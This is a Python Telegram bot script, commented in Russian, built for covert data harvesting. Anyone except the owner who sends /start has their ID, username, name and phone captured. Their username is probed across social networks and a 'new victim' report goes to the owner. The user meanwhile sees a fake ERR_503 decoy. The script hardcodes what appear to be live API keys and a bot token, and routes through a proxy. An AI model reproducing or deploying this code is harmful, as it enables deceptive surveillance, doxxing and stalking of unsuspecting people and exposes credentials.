from telethon import TelegramClient, events
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
import requests
import re
import json
from datetime import datetime

# ========== КОНФИГУРАЦИЯ ==========
API_ID = 26016868
API_HASH = "77863601ac3d8036a0fa3c546fb3c083"
BOT_TOKEN = "8653469627:AAEe_GYwGBCG4R-rZ2ipBtKVMNO7ZIKcnD8"
OWNER_ID = 1185238446

# НАСТРОЙКА MTProto ПРОКСИ ДЛЯ TELETHON
PROXY = {
    'proxy_type': 'mtproto',  # тип прокси
    'addr': 'nitro.alotaxi.info',
    'port': 4515,
    'secret': 'eee9a4f23b1d768c04a8d7f39120ca5b6e626973636f7474692e79656b74616e65742e636f6d'
}

# СОЗДАНИЕ КЛИЕНТА С ПРОКСИ
client = TelegramClient(
    'bot_session',
    API_ID,
    API_HASH,
    connection=ConnectionTcpAbridged,
    proxy=PROXY
).start(bot_token=BOT_TOKEN)

# ========== МОДУЛИ ПРОБИВА ==========
def search_socialmedia_by_username(username: str) -> dict:
    results = {}
    platforms = {
        "Twitter": f"https://twitter.com/{username}",
        "Instagram": f"https://www.instagram.com/{username}/",
        "GitHub": f"https://github.com/{username}"
    }
    for platform, url in platforms.items():
        try:
            resp = requests.get(url, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
            if resp.status_code == 200:
                results[platform] = url
        except:
            pass
    return results

def search_by_phone(phone: str) -> dict:
    results = {}
    phone_clean = re.sub(r"\D", "", phone)
    if len(phone_clean) == 11 and phone_clean.startswith("8"):
        phone_clean = "7" + phone_clean[1:]
    try:
        resp = requests.get(f"https://api.iphone.ru/phoneinfo?phone={phone_clean}", timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            results["operator"] = data.get("operator", {}).get("name")
            results["region"] = data.get("region")
    except:
        pass
    return results

# ========== ПРИВЕТСТВИЕ ДЛЯ ВЛАДЕЛЬЦА ==========
@client.on(events.NewMessage(pattern='/start', from_users=OWNER_ID))
async def owner_start(event):
    await event.reply(
        "✅ **Бот активирован**\n\n"
        f"📌 Ваш ID: `{OWNER_ID}`\n"
        "🔒 Режим: скрытый сбор данных\n"
        "🛡 Заглушка: активна\n"
        "🌐 Прокси: MTProto подключен\n\n"
        "**Команды:**\n"
        "/stats - статус бота\n"
        "/test @username - пробив username"
    )

# ========== ОСНОВНАЯ ЛОГИКА ДЛЯ ВСЕХ ОСТАЛЬНЫХ ==========
@client.on(events.NewMessage(pattern='/start'))
async def stealth_stalker(event):
    user = await event.get_sender()
    
    # Пропускаем владельца (уже обработано выше)
    if user.id == OWNER_ID:
        return
    
    # Сбор данных
    user_info = {
        "user_id": user.id,
        "username": user.username,
        "first_name": user.first_name,
        "last_name": user.last_name,
        "phone_number": getattr(user, 'phone', 'Скрыт'),
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    # Пробив
    osint_data = {}
    if user.username:
        osint_data["social_media"] = search_socialmedia_by_username(user.username)
    
    # Отчет владельцу
    report = f"""[НОВАЯ ЖЕРТВА]
ID: {user_info['user_id']}
Username: @{user_info['username']}
Имя: {user_info['first_name']} {user_info['last_name']}
Телефон: {user_info['phone_number']}
Время: {user_info['timestamp']}

--- ОСINT ---
{json.dumps(osint_data, indent=2, ensure_ascii=False)}

--- ССЫЛКА ---
tg://user?id={user_info['user_id']}"""
    
    await client.send_message(OWNER_ID, report)
    
    # Заглушка
    await event.reply("⚠️ Временно недоступно\nКод ошибки: ERR_503")

# ========== КОМАНДЫ ДЛЯ ВЛАДЕЛЬЦА ==========
@client.on(events.NewMessage(pattern='/stats', from_users=OWNER_ID))
async def stats(event):
    await event.reply("✅ Бот активен. Прокси подключен.")

@client.on(events.NewMessage(pattern='/test (.*)', from_users=OWNER_ID))
async def test(event):
    target = event.pattern_match.group(1)
    if target.startswith("@"):
        username = target[1:]
        result = search_socialmedia_by_username(username)
        await event.reply(json.dumps(result, indent=2, ensure_ascii=False))

# ========== ЗАПУСК ==========
print("=" * 50)
print("БОТ ЗАПУЩЕН (Telethon)")
print(f"API ID: {API_ID}")
print(f"ID владельца: {OWNER_ID}")
print(f"Прокси: {PROXY['addr']}:{PROXY['port']}")
print("=" * 50)

client.run_until_disconnected()
